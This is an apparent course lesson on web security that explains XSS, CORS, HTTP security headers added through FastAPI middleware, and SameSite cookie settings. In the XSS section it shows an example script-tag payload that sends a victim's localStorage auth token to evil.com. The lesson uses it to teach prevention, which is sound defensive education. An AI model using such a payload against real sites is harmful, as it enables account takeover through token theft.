# Sprint 6 · Lesson 3 — XSS, CORS, and HTTP security headers

## What you will build

By the end of this lesson, you understand how XSS attacks work and why React prevents most of them. You add three HTTP security headers to FastAPI (`X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`). You understand how CORS is not a security mechanism for the server — and what it actually protects. You understand `SameSite` cookies. All headers are verified in the browser Network tab.

---

## What you need to know first

- Sprint 1 L4: HTTP request/response, headers, browser Network tab.
- Sprint 4 L4: localStorage, cookies, token storage.
- Sprint 3 L1: Docker, CORS in Sprint 1 L4.

---

## The lesson

---

### 1. XSS: injecting JavaScript into the DOM

**The problem:** XSS (Cross-Site Scripting) is a vulnerability where an attacker injects malicious JavaScript into a webpage that runs in the victim's browser. If the injected script runs, the attacker can: steal tokens from `localStorage`, make authenticated requests on the user's behalf, redirect the user to phishing pages, or capture keystrokes.

**How XSS happens:** A vulnerable application takes user input and renders it as HTML without sanitisation.

Imagine a comment field. User enters: `Great product!` — this is rendered as text. Attacker enters: `<script>document.location='https://evil.com?t='+localStorage.getItem('auth_token')</script>`

If the application renders this string directly as HTML, the browser parses the `<script>` tag and executes the JavaScript. The attacker receives the victim's authentication token at `evil.com`. They are now authenticated as the victim.

**Why your React app prevents this by default:**

```tsx
// Safe: React escapes HTML entities
const title = "<script>alert('xss')</script>"
return <div>{title}</div>
// Renders as: &lt;script&gt;alert('xss')&lt;/script&gt;
// The browser displays literal text, not a script tag
```

React escapes all values rendered with `{expression}` syntax. `<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;`. The browser displays the escaped characters as text — it does not parse them as HTML or JavaScript.

**The one exception — dangerouslySetInnerHTML:**

```tsx
// DANGEROUS: bypasses React's escaping
return <div dangerouslySetInnerHTML={{ __html: userContent }} />
```

`dangerouslySetInnerHTML` renders the string as raw HTML, including any `<script>` tags. The name exists specifically to make you hesitate before using it. If you must use it: sanitise the content with a library like `DOMPurify` first.

**CS lens — output encoding as a security primitive.** XSS happens when the boundary between code and data is violated: user data is treated as HTML code. Output encoding prevents this by converting code-like characters into their text equivalents before rendering. The same principle prevents SQL injection (parameterisation), shell injection (argument escaping), and JSON injection (proper serialisation). The category is: always encode output to match the context it will be interpreted in.

**SE lens — React's default as a secure default.** React's default is to escape HTML. Bypassing this requires an explicit API called `dangerouslySetInnerHTML`. The unsafe path requires deliberate action; the safe path requires no action. This is "secure by default" design: the path of least resistance is the safe path. Compare to PHP's `echo $user_input` (unsafe by default — you must explicitly call `htmlspecialchars()`). Secure defaults shift responsibility: developers opt into unsafe behaviour rather than opting into safe behaviour.

**What breaks without this:** If you add a notes field to work orders and render it with `dangerouslySetInnerHTML` without sanitisation, a user who enters a `<script>` tag in the notes field injects JavaScript that runs in every other user's browser who views that work order. This is stored XSS — the script is stored in the database and served to all viewers.

---

### 2. CORS: what it actually protects

**The background:** You added `CORSMiddleware` in Sprint 1 to allow your React frontend (running on `localhost:5173`) to call the FastAPI backend (running on `localhost:8000`). You may have thought CORS prevents attacks. It does not — in the way you might expect.

**What CORS is:** CORS (Cross-Origin Resource Sharing) is a browser policy. The browser enforces it. The server does not enforce it — it only provides metadata (the `Access-Control-Allow-Origin` header) that the browser uses to decide whether to expose the response to JavaScript.

**What CORS protects against:** CORS prevents a malicious webpage (running at `evil.com`) from using JavaScript to read the response of a cross-origin API call. Example: you are logged into `bank.com`. You visit `evil.com`. The evil page's JavaScript tries `fetch('https://bank.com/api/balance')`. If `bank.com`'s CORS policy does not include `evil.com` in the allowed origins, the browser makes the request (the server receives it) but refuses to give the response to the JavaScript. The attacker's script never sees the balance.

**What CORS does NOT protect against:** 
- Server-side request forgery (SSRF) — the request is made server-to-server, bypassing the browser
- `curl` or any non-browser HTTP client — they ignore CORS headers
- Form submissions — basic HTML forms bypass CORS (CORS only restricts `fetch`/`XMLHttpRequest` reading the response, not the request itself)

**The bottom line:** CORS is a browser feature that limits what cross-origin JavaScript can read. It is not a substitute for authentication and authorisation. Your server-side checks (JWT, ownership) are the real security. CORS is a browser-side convenience boundary.

Your `CORSMiddleware` configuration:

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],  # production: ["https://yourdomain.com"]
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**In production:** replace `allow_origins` with your actual frontend domain. Never use `allow_origins=["*"]` with `allow_credentials=True` — credentials (cookies, Authorization headers) are not sent to wildcard origins, and the combination is rejected by browsers anyway. If you use `["*"]` without credentials, you are saying "any origin can read this API's responses" — appropriate for a public API, not appropriate for an authenticated API.

**CS lens — same-origin policy as the browser's fundamental security model.** The Same-Origin Policy (SOP) is the browser's core security boundary. Two pages are same-origin if their scheme, host, and port all match. JavaScript from one origin cannot read resources from another origin by default. CORS is the controlled exception: servers can declare which other origins may read their responses. SOP prevents the most common web attack (reading data from a site where the user is authenticated). CORS relaxes SOP when the server explicitly permits it.

---

### 3. Add HTTP security headers

**The problem:** Beyond CORS, several HTTP response headers instruct the browser to enforce additional security policies. These headers are widely supported and add meaningful protection with minimal effort.

Add a security headers middleware to `backend/main.py`:

```python
from fastapi import Request
from fastapi.responses import Response
import typing

@app.middleware("http")
async def add_security_headers(request: Request, call_next: typing.Callable) -> Response:
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    # Only add HSTS in production (not HTTP localhost):
    # response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response
```

**Walkthrough — each header:**

**`X-Content-Type-Options: nosniff`**

The browser has a feature called MIME type sniffing: if a server claims a file is `text/plain` but the content looks like JavaScript, the browser may execute it as JavaScript. This allows an attacker who can upload a file (say, a `.txt`) to bypass the Content-Type restriction by making the content look like JavaScript.

`nosniff` disables MIME sniffing: the browser must use the `Content-Type` the server declares. A file declared as `text/plain` is always treated as text, never executed.

**`X-Frame-Options: DENY`**

Prevents the page from being embedded in an `<iframe>`. Without this, an attacker can embed your application in their malicious page at `evil.com`, overlay it with a transparent layer, and trick users into clicking buttons they cannot see (clickjacking). The user believes they are interacting with `evil.com`'s UI but is actually clicking buttons in your application.

`DENY` — no embedding anywhere. `SAMEORIGIN` — only same-origin pages can embed this page. For an API that returns JSON, use `DENY`.

**`Referrer-Policy: strict-origin-when-cross-origin`**

Controls what URL is sent in the `Referer` header when a user navigates from your page to another site. `strict-origin-when-cross-origin` sends only the origin (scheme + host, no path) when navigating cross-origin. This prevents leaking URL paths that might contain sensitive parameters (e.g., `https://app.com/orders/12345/edit` → the external site should not know the order ID).

**`Strict-Transport-Security: max-age=31536000; includeSubDomains` (production only)**

HSTS (HTTP Strict Transport Security) tells browsers: for the next year (31,536,000 seconds), only communicate with this domain over HTTPS. If a user types `http://yourdomain.com`, the browser upgrades it to HTTPS before sending the request — without making the HTTP request first. This prevents SSL stripping attacks (downgrade from HTTPS to HTTP).

HSTS is commented out for development because `localhost` does not have HTTPS. Enabling it on HTTP causes browsers to refuse to load the site. Add it only in production.

**Verify in the browser:**

Open the Network tab, send a request to the API, click the response. Under "Response Headers", verify:
```
x-content-type-options: nosniff
x-frame-options: DENY
referrer-policy: strict-origin-when-cross-origin
```

**CS lens — defence in depth at the browser layer.** Security headers are not replacements for server-side security (authentication, authorisation, parameterised queries). They are an additional layer at the browser level. If a stored XSS vulnerability exists, CSP (Content Security Policy) can limit what the injected script can do. If an attacker attempts clickjacking, `X-Frame-Options` prevents it. Defence in depth: each layer catches what the others miss. No single layer provides complete protection.

**SE lens — security headers as zero-cost defence.** Adding these headers costs nothing in performance and requires fewer than 15 lines of code. Their absence is a consistent finding in security audits. Add them to every FastAPI application by default. Several HTTP security header scanners (securityheaders.com, Mozilla Observatory) score API servers on these headers. Industry-standard baseline includes at minimum: `X-Content-Type-Options`, `X-Frame-Options`, and `Referrer-Policy`.

**What breaks without this:** None of these headers are required for the application to function. They are defensive. Without them, the application is compliant but insecure. The risk: a stored XSS vulnerability combined with no `X-Content-Type-Options` might allow a malicious uploaded file to execute as JavaScript in users' browsers. The headers are cheap insurance.

---

### 4. SameSite cookies

**The background:** Sprint 4 L4 chose `localStorage` for token storage. The alternative — `HttpOnly` cookies — has a different vulnerability: Cross-Site Request Forgery (CSRF).

**CSRF:** An attacker tricks a user into visiting `evil.com`. The evil page makes a request to `bank.com/transfer?amount=1000&to=attacker`. If the user's browser automatically sends their session cookie with this request (which it does by default for cross-site requests), the transfer executes.

**`SameSite=Strict`:** Tells the browser: only send this cookie on requests originating from the same site. A request triggered by `evil.com` visiting `bank.com` does not send the cookie. CSRF is neutralised.

If you later switch from `localStorage` to `HttpOnly` cookies for token storage, add `SameSite=Strict` (or `SameSite=Lax` for slightly more permissive cross-site navigation):

```python
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,         # JavaScript cannot read this cookie
    secure=True,           # Only sent over HTTPS
    samesite="strict",     # Not sent on cross-site requests
    max_age=1800           # 30 minutes, matching token expiry
)
```

`httponly=True` — JavaScript (`document.cookie`) cannot access this cookie. An XSS attack cannot steal it.

`secure=True` — the cookie is only sent over HTTPS. Prevents interception on HTTP.

`samesite="strict"` — only sent on same-site requests. Prevents CSRF.

With all three: the cookie is inaccessible to JavaScript, uninterceptable on HTTP, and not sent cross-site. The tradeoff: `localStorage` is simpler (no CSRF complexity), but accessible to XSS. `HttpOnly` cookie is more secure against XSS, but adds CSRF complexity (needs `SameSite`).

**CS lens — CSRF as ambient authority confusion.** CSRF exploits ambient authority: the browser automatically attaches credentials (cookies) to every request to a domain, whether the request was initiated by the user or by a malicious page. The browser cannot distinguish "the user chose to click this button" from "a script triggered this request." `SameSite` solves this by restricting ambient authority: cookies are only sent for requests that originated from the same site, eliminating cross-site ambient authority.

---

## Connect the pieces

Your application now has:
- XSS protection: React's default escaping, avoid `dangerouslySetInnerHTML` without sanitisation
- CORS: properly configured origin allowlist (not wildcard), CORS understood as a browser policy, not a server security mechanism
- HTTP security headers: `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`
- Cookie security: `SameSite`, `HttpOnly`, `Secure` attributes explained

Lesson 4 adds rate limiting (prevent brute force) and secrets management (environment variables, no secrets in code).

---

## What breaks without this

**`allow_origins=["*"]` with authenticated endpoints:** Wildcard CORS with `allow_credentials=True` is rejected by browsers with an error. If you need wildcard origins, remove `allow_credentials=True` and do not send cookies or `Authorization` headers. For authenticated APIs, always specify exact origins.

---

## Definition of done

- [ ] Security headers middleware is in `main.py` and applied to all responses
- [ ] Browser Network tab shows `x-content-type-options: nosniff` and `x-frame-options: DENY` in API responses
- [ ] You can explain what CORS actually prevents (cross-origin JavaScript reading responses) and what it does not prevent (non-browser requests)
- [ ] You can explain what clickjacking is and how `X-Frame-Options: DENY` prevents it
- [ ] You can explain the tradeoff between `localStorage` and `HttpOnly` cookies for token storage

**Git commit:**

```
git add backend/main.py
git commit -m "Add HTTP security headers middleware: X-Content-Type-Options, X-Frame-Options, Referrer-Policy"
```
